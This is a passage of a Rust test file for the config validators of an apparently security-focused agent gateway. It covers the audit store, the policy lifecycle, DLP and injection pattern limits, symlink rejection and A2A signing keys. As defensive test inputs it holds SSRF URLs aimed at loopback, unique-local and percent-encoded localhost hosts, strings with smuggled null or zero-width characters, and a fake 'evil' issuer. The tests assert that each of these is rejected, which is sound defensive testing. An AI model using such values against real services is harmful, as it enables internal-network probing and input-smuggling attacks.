    let err = cfg.validate().unwrap_err();
    assert!(err.contains("private/loopback"), "got: {err}");
}

#[test]
fn test_audit_store_config_disabled_ssrf_ipv6_unique_local_rejected() {
    // FIND-R203-003: fc00::/7 unique-local rejected unconditionally.
    let cfg = crate::AuditStoreConfig {
        enabled: false,
        database_url: Some("postgres://user:pass@[fd12:3456:789a::1]:5432/db".to_string()),
        ..Default::default()
    };
    let err = cfg.validate().unwrap_err();
    assert!(err.contains("unique-local"), "got: {err}");
}

#[test]
fn test_audit_store_config_disabled_ssrf_percent_encoded_hostname_rejected() {
    // FIND-R203-003: Percent-encoded hostname rejected unconditionally.
    let cfg = crate::AuditStoreConfig {
        enabled: false,
        database_url: Some("postgres://user:pass@%6Cocal%68ost:5432/db".to_string()),
        ..Default::default()
    };
    let err = cfg.validate().unwrap_err();
    assert!(err.contains("percent-encoding"), "got: {err}");
}

#[test]
fn test_audit_store_config_disabled_valid_external_url_accepted() {
    // FIND-R203-003: A valid external postgres URL must still be accepted
    // when the store is disabled.
    let cfg = crate::AuditStoreConfig {
        enabled: false,
        database_url: Some("postgres://user:pass@db.example.com:5432/mydb".to_string()),
        ..Default::default()
    };
    assert!(
        cfg.validate().is_ok(),
        "external URL should pass SSRF check when disabled"
    );
}

#[test]
fn test_audit_store_config_disabled_no_url_passes() {
    // FIND-R203-003: No database_url at all — valid default disabled config.
    let cfg = crate::AuditStoreConfig {
        enabled: false,
        ..Default::default()
    };
    assert!(cfg.validate().is_ok());
}

#[test]
fn test_audit_store_config_disabled_sink_buffer_zero_fails() {
    // FIND-R203-005: sink_buffer_size=0 rejected unconditionally.
    let cfg = crate::AuditStoreConfig {
        enabled: false,
        sink_buffer_size: 0,
        ..Default::default()
    };
    let err = cfg.validate().unwrap_err();
    assert!(err.contains("sink_buffer_size"), "got: {err}");
}

#[test]
fn test_audit_store_config_disabled_flush_interval_zero_fails() {
    // FIND-R203-005: flush_interval_ms=0 rejected unconditionally.
    let cfg = crate::AuditStoreConfig {
        enabled: false,
        flush_interval_ms: 0,
        ..Default::default()
    };
    let err = cfg.validate().unwrap_err();
    assert!(err.contains("flush_interval_ms"), "got: {err}");
}

#[test]
fn test_audit_store_config_disabled_batch_insert_size_zero_fails() {
    // FIND-R203-005: batch_insert_size=0 rejected unconditionally.
    let cfg = crate::AuditStoreConfig {
        enabled: false,
        batch_insert_size: 0,
        ..Default::default()
    };
    let err = cfg.validate().unwrap_err();
    assert!(err.contains("batch_insert_size"), "got: {err}");
}

#[test]
fn test_audit_store_config_disabled_connect_timeout_zero_fails() {
    // FIND-R203-005: connect_timeout_secs=0 rejected unconditionally.
    let cfg = crate::AuditStoreConfig {
        enabled: false,
        connect_timeout_secs: 0,
        ..Default::default()
    };
    let err = cfg.validate().unwrap_err();
    assert!(err.contains("connect_timeout_secs"), "got: {err}");
}

#[test]
fn test_audit_store_config_disabled_pool_size_over_max_fails() {
    // FIND-R203-005: pool_size > MAX_POOL_SIZE rejected unconditionally.
    let cfg = crate::AuditStoreConfig {
        enabled: false,
        pool_size: 101,
        ..Default::default()
    };
    let err = cfg.validate().unwrap_err();
    assert!(err.contains("pool_size"), "got: {err}");
}

#[test]
fn test_audit_store_config_disabled_sink_buffer_over_max_fails() {
    // FIND-R203-005: sink_buffer_size > MAX_SINK_BUFFER_SIZE rejected unconditionally.
    let cfg = crate::AuditStoreConfig {
        enabled: false,
        sink_buffer_size: 10_001,
        ..Default::default()
    };
    let err = cfg.validate().unwrap_err();
    assert!(err.contains("sink_buffer_size"), "got: {err}");
}

// ═══════════════════════════════════════════════════════════════════
// Phase 47: Policy Lifecycle Config Tests
// ═══════════════════════════════════════════════════════════════════

#[test]
fn test_policy_lifecycle_config_default_validates() {
    let cfg = crate::PolicyLifecycleConfig::default();
    assert!(cfg.validate().is_ok());
    assert!(!cfg.enabled);
}

#[test]
fn test_policy_lifecycle_config_serde_roundtrip() {
    let cfg = crate::PolicyLifecycleConfig {
        enabled: true,
        required_approvals: 2,
        auto_approve_roles: vec!["admin".to_string()],
        staging_period_secs: 7200,
        notification_webhook_url: None,
        max_versions_per_policy: 25,
    };
    let json = serde_json::to_string(&cfg).unwrap();
    let back: crate::PolicyLifecycleConfig = serde_json::from_str(&json).unwrap();
    assert_eq!(back.required_approvals, 2);
    assert_eq!(back.staging_period_secs, 7200);
}

#[test]
fn test_policy_lifecycle_config_excessive_required_approvals() {
    let cfg = crate::PolicyLifecycleConfig {
        required_approvals: 21,
        ..Default::default()
    };
    assert!(cfg.validate().unwrap_err().contains("required_approvals"));
}

#[test]
fn test_policy_lifecycle_config_ssrf_localhost_rejected() {
    let cfg = crate::PolicyLifecycleConfig {
        notification_webhook_url: Some("https://localhost:8080/hook".to_string()),
        ..Default::default()
    };
    assert!(cfg.validate().is_err());
}

#[test]
fn test_policy_lifecycle_config_zero_max_versions_rejected() {
    let cfg = crate::PolicyLifecycleConfig {
        max_versions_per_policy: 0,
        ..Default::default()
    };
    assert!(cfg
        .validate()
        .unwrap_err()
        .contains("max_versions_per_policy"));
}

#[test]
fn test_policy_lifecycle_config_excessive_max_versions_rejected() {
    let cfg = crate::PolicyLifecycleConfig {
        max_versions_per_policy: 101,
        ..Default::default()
    };
    assert!(cfg
        .validate()
        .unwrap_err()
        .contains("max_versions_per_policy"));
}

#[test]
fn test_policy_lifecycle_config_dangerous_chars_in_role() {
    let cfg = crate::PolicyLifecycleConfig {
        auto_approve_roles: vec!["admin\x00evil".to_string()],
        ..Default::default()
    };
    assert!(cfg.validate().unwrap_err().contains("auto_approve_roles"));
}

#[test]
fn test_policy_lifecycle_config_in_policy_config_toml() {
    let toml_str = r#"
[policy_lifecycle]
enabled = true
required_approvals = 2
max_versions_per_policy = 30
"#;
    let config: crate::PolicyConfig = toml::from_str(toml_str).unwrap();
    assert!(config.policy_lifecycle.enabled);
    assert_eq!(config.policy_lifecycle.required_approvals, 2);
    assert_eq!(config.policy_lifecycle.max_versions_per_policy, 30);
    assert!(config.validate().is_ok());
}

// ═══════════════════════════════════════════════════════════════════
// Consumer Shield Preset Tests (Phase 70)
// ═══════════════════════════════════════════════════════════════════

#[test]
fn test_consumer_shield_preset_parses() {
    let toml_str = std::fs::read_to_string("../examples/presets/consumer-shield.toml")
        .expect("consumer-shield.toml not found");
    let config: crate::PolicyConfig =
        toml::from_str(&toml_str).expect("consumer-shield.toml failed to parse");
    assert!(config.shield.enabled);
    assert_eq!(config.shield.audit_mode, "local");
    assert!(config.shield.sanitize_queries);
    assert!(config.shield.desanitize_responses);
    assert!(config.shield.session_isolation);
    assert!(config.shield.merkle_proofs);
    assert!(config.shield.session_unlinkability);
    assert_eq!(config.shield.credential_pool_size, 50);
    assert_eq!(config.shield.replenish_threshold, 10);
    assert_eq!(config.shield.credential_epoch_interval, 100);
    assert_eq!(config.shield.stylometric_level, "none");
    assert!(config.injection.enabled);
    assert!(config.dlp.enabled);
    assert!(config.sampling.enabled);
    assert!(config.validate().is_ok());
}

#[test]
fn test_consumer_shield_preset_all_levels_valid() {
    for level in &["none", "level1", "level2"] {
        let toml_str = format!(
            r#"
[shield]
enabled = true
stylometric_level = "{level}"
"#
        );
        let config: crate::PolicyConfig = toml::from_str(&toml_str).unwrap();
        assert!(
            config.shield.validate().is_ok(),
            "level {level} should be valid"
        );
    }
}

#[test]
fn test_consumer_shield_invalid_stylometric_level() {
    let toml_str = r#"
[shield]
enabled = true
stylometric_level = "level3"
"#;
    let config: crate::PolicyConfig = toml::from_str(toml_str).unwrap();
    let result = config.shield.validate();
    assert!(result.is_err());
    assert!(result.unwrap_err().contains("stylometric_level"));
}

#[test]
fn test_consumer_shield_credential_bounds() {
    // replenish_threshold must be < credential_pool_size
    let toml_str = r#"
[shield]
enabled = true
credential_pool_size = 10
replenish_threshold = 10
"#;
    let config: crate::PolicyConfig = toml::from_str(toml_str).unwrap();
    assert!(config.shield.validate().is_err());
}

#[test]
fn test_consumer_shield_zero_epoch_rejected() {
    let toml_str = r#"
[shield]
enabled = true
credential_epoch_interval = 0
"#;
    let config: crate::PolicyConfig = toml::from_str(toml_str).unwrap();
    assert!(config.shield.validate().is_err());
}

// ── R250-CFG-1: DLP extra_patterns bounded ────────────────────

#[test]
fn test_r250_cfg1_dlp_extra_patterns_bounded() {
    let dlp = crate::DlpConfig {
        extra_patterns: (0..201)
            .map(|i| (format!("name_{i}"), format!("pattern_{i}")))
            .collect(),
        ..crate::DlpConfig::default()
    };
    let result = dlp.validate();
    assert!(result.is_err(), "should reject >200 extra_patterns");
    assert!(result.unwrap_err().contains("200"));
}

#[test]
fn test_r250_cfg1_dlp_extra_pattern_empty_name_rejected() {
    let dlp = crate::DlpConfig {
        extra_patterns: vec![("".to_string(), "pattern".to_string())],
        ..crate::DlpConfig::default()
    };
    assert!(dlp.validate().is_err());
}

#[test]
fn test_r250_cfg1_dlp_extra_pattern_dangerous_chars_rejected() {
    let dlp = crate::DlpConfig {
        extra_patterns: vec![("name\x00bad".to_string(), "pattern".to_string())],
        ..crate::DlpConfig::default()
    };
    assert!(dlp.validate().is_err());
}

// ── R250-CFG-2: Injection extra_patterns bounded ──────────────

#[test]
fn test_r250_cfg2_injection_extra_patterns_bounded() {
    let inj = crate::InjectionConfig {
        extra_patterns: (0..201).map(|i| format!("pattern_{i}")).collect(),
        ..crate::InjectionConfig::default()
    };
    let result = inj.validate();
    assert!(result.is_err(), "should reject >200 extra_patterns");
}

#[test]
fn test_r250_cfg2_injection_disabled_patterns_bounded() {
    let inj = crate::InjectionConfig {
        disabled_patterns: (0..201).map(|i| format!("pattern_{i}")).collect(),
        ..crate::InjectionConfig::default()
    };
    let result = inj.validate();
    assert!(result.is_err(), "should reject >200 disabled_patterns");
}

#[test]
fn test_r250_cfg2_injection_empty_pattern_rejected() {
    let inj = crate::InjectionConfig {
        extra_patterns: vec!["".to_string()],
        ..crate::InjectionConfig::default()
    };
    assert!(inj.validate().is_err());
}

// ── R250-CFG-3: Dangerous chars in enum-matched strings ───────

#[test]
fn test_r250_cfg3_fips_dangerous_chars_rejected() {
    let fips = crate::FipsConfig {
        enabled: false,
        signature_algorithm: "ed25519\x00".to_string(),
    };
    assert!(fips.validate().is_err());
}

#[test]
fn test_r250_cfg3_topology_fallback_mode_dangerous_chars_rejected() {
    let topo = crate::TopologyConfig {
        fallback_mode: "deny\x01".to_string(),
        ..crate::TopologyConfig::default()
    };
    assert!(topo.validate().is_err());
}

// ── R250-CFG-4: Audit custom_pii_patterns bounded ─────────────

#[test]
fn test_r250_cfg4_audit_custom_pii_patterns_bounded() {
    let audit = crate::AuditConfig {
        custom_pii_patterns: (0..101)
            .map(|i| crate::CustomPiiPattern {
                name: format!("name_{i}"),
                pattern: format!("pattern_{i}"),
            })
            .collect(),
        ..crate::AuditConfig::default()
    };
    let result = audit.validate();
    assert!(result.is_err(), "should reject >100 custom_pii_patterns");
}

#[test]
fn test_r250_cfg4_audit_custom_pii_pattern_empty_name_rejected() {
    let audit = crate::AuditConfig {
        custom_pii_patterns: vec![crate::CustomPiiPattern {
            name: "".to_string(),
            pattern: "foo".to_string(),
        }],
        ..crate::AuditConfig::default()
    };
    assert!(audit.validate().is_err());
}

#[test]
fn test_r250_cfg4_audit_custom_pii_pattern_dangerous_chars_rejected() {
    let audit = crate::AuditConfig {
        custom_pii_patterns: vec![crate::CustomPiiPattern {
            name: "bad\x07name".to_string(),
            pattern: "foo".to_string(),
        }],
        ..crate::AuditConfig::default()
    };
    assert!(audit.validate().is_err());
}

// ═══════════════════════════════════════════════════════════════════════
// R252: MemoryTrackingConfig validation wiring
// ═══════════════════════════════════════════════════════════════════════

#[test]
fn test_r252_cfg1_memory_tracking_validate_default_ok() {
    let config = crate::MemoryTrackingConfig::default();
    assert!(config.validate().is_ok());
}

#[test]
fn test_r252_cfg1_memory_tracking_wired_in_policy_config() {
    // Verify that MemoryTrackingConfig.validate() is called by PolicyConfig.validate().
    // Since the struct only has bool fields, the easiest verification is that
    // a valid PolicyConfig with non-default memory_tracking still validates.
    let mut config = PolicyConfig::default();
    config.memory_tracking.enabled = true;
    config.memory_tracking.block_on_match = true;
    assert!(config.validate().is_ok());
}

// ═══════════════════════════════════════════════════════════════════════
// F7: Config symlink rejection
// ═══════════════════════════════════════════════════════════════════════

/// SECURITY (F7): load_file must reject symbolic links to prevent TOCTOU attacks.
#[cfg(unix)]
#[test]
fn test_load_file_rejects_symlink() {
    use std::io::Write;

    let dir = std::env::temp_dir().join("vellaveto_test_symlink_f7");
    let _ = std::fs::remove_dir_all(&dir);
    std::fs::create_dir_all(&dir).expect("create temp dir");

    // Create a valid TOML config file
    let real_path = dir.join("real_config.toml");
    let mut f = std::fs::File::create(&real_path).expect("create real file");
    writeln!(f, "[policies]").expect("write toml");
    drop(f);

    // Create a symlink to it
    let link_path = dir.join("link_config.toml");
    std::os::unix::fs::symlink(&real_path, &link_path).expect("create symlink");

    // load_file must reject the symlink
    let result = PolicyConfig::load_file(link_path.to_str().expect("path to str"));
    assert!(result.is_err(), "load_file must reject symlinks");
    let err_msg = result.unwrap_err().to_string();
    assert!(
        err_msg.contains("symbolic link"),
        "Error must mention 'symbolic link', got: {err_msg}"
    );

    // Cleanup
    let _ = std::fs::remove_dir_all(&dir);
}

// ═══════════════════════════════════════════════════════
// A2A Agent Card signature enforcement config
// ═══════════════════════════════════════════════════════

/// A syntactically valid hex-encoded Ed25519 public key (32 bytes).
const TEST_PUBKEY_HEX: &str = "d75a980182b10ab7d54bfed3c964073a0ee172f3daa62325af021a68f707511a";

fn test_trusted_key(key_id: &str) -> crate::a2a::TrustedAgentKey {
    crate::a2a::TrustedAgentKey {
        key_id: key_id.to_string(),
        public_key: TEST_PUBKEY_HEX.to_string(),
        issuer: "https://agent.example.com".to_string(),
    }
}

#[test]
fn test_a2a_signature_defaults_are_fail_closed() {
    let sig = crate::a2a::A2aSignatureConfig::default();
    assert!(sig.enabled, "signature enforcement must default to on");
    assert!(
        sig.require_card_hash_match,
        "card hash matching must default to on"
    );
    assert!(sig.trusted_keys.is_empty());
    assert!(sig.validate().is_ok());
}

#[test]
fn test_a2a_signature_rejects_duplicate_key_id() {
    let sig = crate::a2a::A2aSignatureConfig {
        trusted_keys: vec![test_trusted_key("dup"), test_trusted_key("dup")],
        ..Default::default()
    };
    let err = sig.validate().unwrap_err();
    assert!(
        err.contains("duplicate key_id") && err.contains("dup"),
        "expected duplicate key_id error, got: {err}"
    );
}

#[test]
fn test_a2a_signature_rejects_wrong_length_public_key() {
    let mut key = test_trusted_key("k1");
    key.public_key = "0123456789abcdef".to_string(); // valid hex, only 8 bytes
    let sig = crate::a2a::A2aSignatureConfig {
        trusted_keys: vec![key],
        ..Default::default()
    };
    let err = sig.validate().unwrap_err();
    assert!(
        err.contains("public_key invalid") && err.contains("32 bytes"),
        "expected public key length error, got: {err}"
    );
}

#[test]
fn test_a2a_signature_rejects_non_hex_public_key() {
    let mut key = test_trusted_key("k1");
    // Right length, but 'z' and 'q' are not hex digits.
    key.public_key = "z75a980182b10ab7d54bfed3c964073a0ee172f3daa62325af021a68f707511q".to_string();
    assert_eq!(key.public_key.len(), 64);
    let sig = crate::a2a::A2aSignatureConfig {
        trusted_keys: vec![key],
        ..Default::default()
    };
    let err = sig.validate().unwrap_err();
    assert!(
        err.contains("public_key invalid"),
        "expected hex decode error, got: {err}"
    );
}

#[test]
fn test_a2a_signature_rejects_all_zeros_public_key() {
    // An all-zeros key is cryptographically invalid; reusing the shared
    // validator is what catches it, and it would otherwise sit in the trust
    // store looking legitimate.
    let mut key = test_trusted_key("k1");
    key.public_key = "0".repeat(64);
    let sig = crate::a2a::A2aSignatureConfig {
        trusted_keys: vec![key],
        ..Default::default()
    };
    let err = sig.validate().unwrap_err();
    assert!(
        err.contains("all zeros"),
        "expected all-zeros key rejection, got: {err}"
    );
}

#[test]
fn test_a2a_signature_rejects_empty_key_id_and_issuer() {
    let mut key = test_trusted_key("");
    let sig = crate::a2a::A2aSignatureConfig {
        trusted_keys: vec![key.clone()],
        ..Default::default()
    };
    assert!(sig.validate().unwrap_err().contains("empty key_id"));

    key = test_trusted_key("k1");
    key.issuer = String::new();
    let sig = crate::a2a::A2aSignatureConfig {
        trusted_keys: vec![key],
        ..Default::default()
    };
    assert!(sig.validate().unwrap_err().contains("empty issuer"));
}

#[test]
fn test_a2a_signature_rejects_dangerous_chars_in_key_fields() {
    let mut key = test_trusted_key("key\u{200B}id");
    let sig = crate::a2a::A2aSignatureConfig {
        trusted_keys: vec![key.clone()],
        ..Default::default()
    };
    assert!(sig
        .validate()
        .unwrap_err()
        .contains("control or format characters"));

    key = test_trusted_key("k1");
    key.issuer = "https://evil\u{200B}.example.com".to_string();
    let sig = crate::a2a::A2aSignatureConfig {
        trusted_keys: vec![key],
        ..Default::default()
    };
    assert!(sig
        .validate()
        .unwrap_err()
        .contains("control or format characters"));
}

#[test]
fn test_a2a_signature_rejects_out_of_range_lifetimes() {
    let sig = crate::a2a::A2aSignatureConfig {
        max_token_lifetime_secs: 0,
        ..Default::default()
    };
    assert!(sig.validate().unwrap_err().contains("must be > 0"));

    let sig = crate::a2a::A2aSignatureConfig {
        max_token_lifetime_secs: 86_401,
        ..Default::default()
    };
    assert!(sig.validate().unwrap_err().contains("24 hours"));

    // Skew is bounded far tighter than lifetime: it widens the window in which
    // an already-expired card is still accepted.
    let sig = crate::a2a::A2aSignatureConfig {
        clock_skew_secs: 301,
        ..Default::default()
    };
    assert!(sig.validate().unwrap_err().contains("5 minutes"));
}

#[test]
fn test_a2a_signature_rejects_too_many_trusted_keys() {
    let sig = crate::a2a::A2aSignatureConfig {
        trusted_keys: (0..65)
            .map(|i| test_trusted_key(&format!("k{i}")))
            .collect(),
        ..Default::default()
    };
    assert!(sig.validate().unwrap_err().contains("exceeds maximum"));
}

#[test]
fn test_a2a_enforcement_without_trusted_keys_is_a_config_error() {
    // Enforcement on with no keys can never verify a card, so every request
    // would be denied. Fail-closed, but indistinguishable from an outage —
    // so it must be rejected at load, not discovered in production.
    let config = crate::a2a::A2aConfig {
        enabled: true,
        require_agent_card: true,
        ..Default::default()
    };
    let err = config.validate().unwrap_err();
    assert!(
        err.contains("trusted_keys is empty") && err.contains("every request would be denied"),
        "expected empty-trusted-keys error, got: {err}"
    );
}

#[test]
fn test_a2a_enforcement_with_a_trusted_key_validates() {
    let config = crate::a2a::A2aConfig {
        enabled: true,
        require_agent_card: true,
        signature: crate::a2a::A2aSignatureConfig {
            trusted_keys: vec![test_trusted_key("agent-prod-2026")],
            ..Default::default()
        },
        ..Default::default()
    };
    assert!(config.validate().is_ok());
}

#[test]
fn test_a2a_disabled_listener_does_not_require_trusted_keys() {
    // a2a.enabled is false by default, so the stricter check must not fire for
    // deployments that never run the A2A listener.
    let config = crate::a2a::A2aConfig::default();
    assert!(!config.enabled);
    assert!(config.validate().is_ok());
}

#[test]
fn test_a2a_signature_config_roundtrips_through_toml() {
    let config = crate::a2a::A2aConfig {
        enabled: true,
        require_agent_card: true,
        signature: crate::a2a::A2aSignatureConfig {
            trusted_keys: vec![test_trusted_key("agent-prod-2026")],
            ..Default::default()
        },
        ..Default::default()
    };
    let toml_str = toml::to_string(&config).expect("serialize");
    let parsed: crate::a2a::A2aConfig = toml::from_str(&toml_str).expect("deserialize");
    assert_eq!(parsed, config);
    assert!(parsed.validate().is_ok());
}

#[test]
fn test_a2a_signature_rejects_unknown_fields() {
    let toml_str = r#"
        enabled = true
        max_token_lifetime_secs = 3600
        clock_skew_secs = 60
        require_card_hash_match = true
        surprise = "field"
    "#;
    let parsed: Result<crate::a2a::A2aSignatureConfig, _> = toml::from_str(toml_str);
    assert!(parsed.is_err(), "deny_unknown_fields must reject extras");
}
